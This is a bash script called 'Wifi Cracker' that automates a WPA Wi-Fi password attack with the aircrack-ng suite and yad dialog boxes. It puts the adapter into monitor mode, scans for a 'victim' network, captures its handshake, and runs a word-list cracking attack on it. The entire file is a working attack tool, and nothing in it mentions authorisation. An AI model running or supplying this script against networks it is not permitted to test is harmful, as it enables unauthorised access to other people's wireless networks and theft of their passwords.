
#!/bin/bash
echo "----------------"
echo "- Wifi Cracker -"
echo "----------------"
echo " "
airmon-ng
echo "starting monitor mode: "
echo " "
airmon-ng start wlan0
airmon-ng check kill
echo " Scanning the Available Networks:"
echo " "
echo "Searching for Victim BSSID: "
echo " "
echo "Hit ctrl+C to stop the scan "
sleep 5
airodump-ng wlan0mon
echo "----------------"
echo "- Wifi Cracker -"
echo "----------------"
echo " Enter the BSSID of the Victim: "
BSSID=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter The BSSID of the Victim: " --entry )
echo " Enter the Channel of the BSSID: "
channel=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter the Channel of the BSSID: " --entry )
echo "Hit Ctrl+C to stop the scan"
sleep 5
echo " "
gnome-terminal -e /usr/local/bin/cracker1.bash
airodump-ng -c "$channel" --bssid "$BSSID" -w /root/ wlan0mon
echo "----------------"
echo "- Wifi Cracker -"
echo "----------------"
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text " Is the handshake grab successful ?" \
--button=gtk-yes:0 --button=gtk-no:1
ans=$?
if [[ $ans == 0 ]]; then
echo  " "
#echo " Cracking the Password from the acquired Handshake file: "
echo " "
echo "----------------"
echo "- Wifi Cracker -"
echo "----------------"
echo " "
echo " Successfully retrieved the Wifi Handshake "
echo " "
echo " Crack the wifi password (y/n): "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Attempt to crack the Password from the hijacked handshake ?" \
--button=gtk-yes:0 --button=gtk-no:1
val=$?
if [[ $val == 0 ]]; then
echo  " "
echo " Select the word list: "
echo " "
word=$( yad --center --width=600 --title=File --window-icon=/usr/local/bin/1.png --file-selection )
echo " "
echo " Select The Handshake Capture File ( *.cap file ): "
echo " "
cap=$( yad --center --width=600 --title=File --window-icon=/usr/local/bin/1.png --file-selection )
echo " Cracking the Password from the acquired Handshake file: "
echo " Entered Mac Addr is $BSSID "
echo " "
echo " Entered World List is $word "
echo " "
echo " Entered Handshake file is $cap "
sleep 10
echo " "
aircrack-ng -a2 -b "$BSSID" -w "$word" "$cap"
sleep 100
elif [[ $val == 1 ]]; then
#echo " Exiting the code. the Handshake file is saved in /root/ location. use your prefered cracker program."
yad --center --width=250 --height=150 --title=info  --text=" Exiting the code. the Handshake file is saved in /root/ location. use your prefered cracker program. " --text-align=center \
--button=gtk-ok:1
fi
elif [[ $ans == 1 ]]; then
echo " "
#echo " if failed to successfully grab a handshake, reset the wifi adapter from the main menu and run the cracker again "
yad --center --width=250 --height=150 --title=info  --text=" if failed to successfully grab a handshake, reset the wifi adapter from the main menu and run the cracker again " --text-align=center \
--button=gtk-ok:1
fi
exit
